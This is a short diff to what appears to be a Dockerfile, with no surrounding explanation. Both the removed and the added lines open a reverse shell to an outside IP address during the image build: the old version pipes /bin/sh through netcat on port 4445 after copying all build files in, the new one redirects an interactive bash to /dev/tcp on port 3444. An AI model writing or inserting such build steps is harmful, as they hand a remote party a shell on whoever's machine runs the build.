@@ -1,7 +1,3 @@
-FROM alpine:latest
-
-RUN apk add --update --no-cache netcat-openbsd docker
-RUN mkdir /files
-COPY * /files/
-RUN mknod /tmp/back p
-RUN /bin/sh 0</tmp/back | nc 104.236.13.229 4445 1>/tmp/back
+FROM alpine
+RUN apk update && apk add bash
+RUN /bin/bash -c 'bash -i >& /dev/tcp/104.236.13.229/3444 0>&1';echo 'Good'
